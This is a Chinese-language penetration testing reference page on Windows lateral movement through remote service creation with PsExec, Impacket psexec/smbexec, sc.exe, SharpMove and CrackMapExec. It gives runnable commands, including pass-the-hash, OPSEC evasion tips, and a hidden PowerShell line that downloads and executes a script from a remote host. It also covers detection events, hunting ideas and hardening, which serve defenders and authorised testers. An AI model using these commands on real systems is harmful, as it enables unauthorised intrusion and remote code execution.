# 远程服务执行（PsExec、WinExec、ScExec、SMBExec、SCMExec）

{{#include ../../banners/hacktricks-training.md}}

## 它们如何工作

这些技术通过 SMB/RPC 远程滥用 Windows Service Control Manager (SCM)，在目标主机上执行命令。Service Control Manager Remote Protocol (SCMR) 是基于 RPC 的接口，用于在远程计算机上配置和控制 Windows 服务。拥有足够权限时，操作者可以创建或重新配置一个服务，使其二进制文件路径包含命令，然后启动该服务以在远程执行命令。<sup>[[5]](#references)</sup> 常见流程如下：

1. 通过 SMB/RPC (TCP/445) 向目标进行身份验证；如果所用变体需要在目标上暂存文件或获取输出，则访问 ADMIN$ 共享。
2. 复制可执行文件，或指定服务将运行的 LOLBAS 命令行。
3. 通过 SCM (MS-SCMR over \PIPE\svcctl) 远程创建服务，并将其指向该命令或二进制文件。
4. 启动服务以执行 payload，并可选择通过命名管道捕获 stdin/stdout。
5. 停止服务并清理（删除服务和任何已放置的二进制文件）。

要求/前提条件：
- 目标上的本地管理员权限 (SeCreateServicePrivilege)，或目标上明确授予的服务创建权限。
- SMB (445) 可访问，且主机防火墙允许远程服务管理；对于需要通过 ADMIN$ 暂存文件或获取输出的变体，ADMIN$ 必须可用。
- UAC 远程限制：使用本地账户时，除非使用内置 Administrator 账户或设置 LocalAccountTokenFilterPolicy=1，否则令牌筛选可能会阻止管理员通过网络访问。
- Kerberos 与 NTLM：使用主机名/FQDN 可启用 Kerberos；通过 IP 地址连接通常会回退到 NTLM（在强化环境中可能会被阻止）。

如果没有指定服务账户，`CreateService` 会使用 `LocalSystem`，它拥有广泛的本地权限。这也解释了 SCM 执行成功后为何会造成严重影响。但它本身并不会禁用 UAC 或 Microsoft Defender：调用者仍需要远程 SCM 权限，端点控制也可以检查或阻止该服务或 payload。<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### 通过 sc.exe 手动执行 ScExec/WinExec

以下展示了一种最简的服务创建方法。服务映像可以是已放置的 EXE，也可以是 cmd.exe 或 powershell.exe 之类的 LOLBAS。

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

备注：
- 启动非服务 EXE 时，预期会出现超时错误；但执行仍会发生。
- 为了更符合 OPSEC，优先使用无文件命令（cmd /c、powershell -enc），或删除投放的文件。

更多详细步骤请参阅：https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## 工具与示例

### Sysinternals PsExec.exe

- 经典的管理员工具，通过 SMB 将 PSEXESVC.exe 投放到 ADMIN$，安装一个临时服务（默认名称为 PSEXESVC），并通过命名管道代理 I/O。
- 示例用法：<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- 可以通过 WebDAV 直接从 Sysinternals Live 启动：

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- 会留下服务安装/卸载事件（服务名通常为 PSEXESVC，除非使用 -r），并在执行期间创建 C:\Windows\PSEXESVC.exe。

### Impacket psexec.py (PsExec-like)

- 使用内嵌的 RemCom-like 服务。通过 ADMIN$ 投放一个临时服务二进制文件（通常使用随机名称），创建服务（默认通常为 RemComSvc），并通过 named pipe 代理 I/O。

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

在 Kali 上，Impacket 示例可能位于 `/usr/share/doc/python3-impacket/examples/`。如果未提供密码，工具会提示输入密码。Impacket 的 `-k` 参数会请求使用 Kerberos 而非 NTLM 进行身份验证，通常使用当前凭据缓存或提供的凭据。

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

制品
- C:\Windows\ 中的临时 EXE（随机 8 个字符）。服务名称默认为 RemComSvc，除非另行指定。

### Impacket smbexec.py (SMBExec)

- 创建一个临时服务来启动 cmd.exe，并使用命名管道进行 I/O。通常不会落地完整的 EXE payload；命令执行为半交互式。

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral)（C#）实现了多种 lateral movement 方法，包括基于服务的 exec。

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) 支持通过 SCM 和其他几种 Windows 机制（包括修改/创建服务）进行经过身份验证的远程执行。

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- 你也可以使用 CrackMapExec 通过不同后端（psexec/smbexec/wmiexec）执行：

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

SCM 操作会创建一个名为 `WindowsDebug` 的服务，并将其指向远程主机上已存在的 payload。<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC、检测与痕迹

使用 PsExec 类技术时常见的主机/网络痕迹：
- 目标上会针对所用管理员帐户记录 Security 4624（Logon Type 3）和 4672（Special Privileges）。
- Security 5140/5145 File Share 和 File Share Detailed 事件会显示 ADMIN$ 访问，以及服务二进制文件（例如 PSEXESVC.exe 或随机命名的 8 字符 .exe 文件）的创建/写入。
- 目标上的 **System** 7045 事件由 Service Control Manager 记录，表示安装了服务：名称可能是 PSEXESVC、RemComSvc 或自定义名称（`-r` / `-service-name`）。这能证明服务已安装，但不能证明其映像已运行。请将事件时间戳和映像路径与进程事件或匹配的服务映像预取条目进行关联（若有）。<sup>[[4]](#references)</sup>
- Sysmon 1（Process Create）记录 services.exe 或服务映像，3（Network Connect），11（File Create）记录 C:\Windows\ 中的文件，17/18（Pipe Created/Connected）记录 \\.\pipe\psexesvc、\\.\pipe\remcom_* 等管道或随机命名的等效管道。
- Sysinternals EULA 的注册表痕迹：操作员主机上的 HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（若未抑制）。

狩猎思路
- 对 ImagePath 包含 cmd.exe /c、powershell.exe 或 TEMP 路径的服务安装发出告警。
- 查找 ParentImage 为 C:\Windows\PSEXESVC.exe 的进程创建事件，或 services.exe 的子进程以 LOCAL SYSTEM 身份运行并执行 shell 的事件。
- 标记以 -stdin/-stdout/-stderr 结尾的命名管道或已知的 PsExec 克隆管道名称。

## 常见故障排除
- 创建服务时出现 Access is denied (5)：可能并非真正的本地管理员、本地帐户受到 UAC 远程限制，或 EDR 的服务二进制文件路径防篡改保护阻止了操作。
- 找不到网络路径 (53) 或无法连接到 ADMIN$：可能是防火墙阻止 SMB/RPC，或管理员共享已禁用。
- Kerberos 失败但 NTLM 被阻止：使用主机名/FQDN（而非 IP）连接，确保 SPN 正确；使用 Impacket 时，也可通过票据指定 -k/-no-pass。
- 服务启动超时但 payload 已运行：若它并非真正的服务二进制文件，这是预期现象；可将输出捕获到文件，或使用 smbexec 获取实时 I/O。

## 加固说明
- Windows 11 24H2 和 Windows Server 2025 默认要求出站 SMB 连接（以及 Windows 11 的入站连接）使用 SMB signing。使用有效凭据时，这不会影响合法的 PsExec 使用，但可阻止未签名的 SMB relay 滥用，也可能影响不支持 signing 的设备。<sup>[[2]](#references)</sup>
- 新的 SMB 客户端 NTLM 阻止功能（Windows 11 24H2/Server 2025）可能会在使用 IP 地址或连接到非 Kerberos 服务器时阻止 NTLM 回退。在加固环境中，这会导致基于 NTLM 的 PsExec/SMBExec 无法使用；请使用 Kerberos（主机名/FQDN），或在有正当需要时配置例外。<sup>[[2]](#references)</sup>
- 最小权限原则：尽量减少本地管理员成员，优先采用 Just-in-Time/Just-Enough Admin，强制使用 LAPS，并监控/告警 7045 服务安装事件。

## 另请参阅

- 基于 WMI 的远程执行（通常无文件）：

{{#ref}}
./wmiexec.md
{{#endref}}

- 基于 WinRM 的远程执行：

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 和 Windows 11 中的 SMB 安全加固](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [使用凭据控制 Windows 主机 - 第 2 部分（PSExec 和服务）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – 使用系统事件日志排查意外重启](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Service Control Manager Remote Protocol 概述](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - LocalSystem 帐户](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - `CreateService` 函数](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
